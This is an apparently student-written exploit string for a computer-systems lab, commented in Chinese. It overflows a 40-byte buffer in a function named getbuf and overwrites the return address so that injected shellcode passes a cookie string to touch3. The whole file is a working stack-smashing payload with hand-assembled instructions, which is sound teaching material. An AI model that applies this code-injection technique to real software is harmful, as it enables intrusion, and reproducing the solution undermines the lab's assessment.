/* 40 字节空字符串 */
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

/* 抵消函数 `getbuf` 的 `ret` 指令, 原地返回至攻击字符串 */
a8 dc 61 55 00 00 00 00

/* 攻击代码, 作用是传入 cookie 字符串起始地址, 移动 `$rsp`, 执行 `ret` */
/*
    leaq 0x20(%rsp), %rdi  # 传入 cookie 字符串起始地址
    addq $0x18, %rsp  # 将 %rsp 指向存有函数 `touch3` 入口地址的内存地址
    ret  # 执行跳转
*/
48 8d 7c 24 20 48 83 c4 18 c3

/* 存储函数入口地址需要对齐 8 字节 */
00 00 00 00 00 00

/* 为了避免 printf 出现溢出错误, 实际上需要对齐 16 字节, 因此再额外添加 8 个字节的空字符串 */
00 00 00 00 00 00 00 00

/* 函数 `touch3` 的入口地址 */
fa 18 40 00 00 00 00 00

/* cookie 字符串 */
35 39 62 39 39 37 66 61
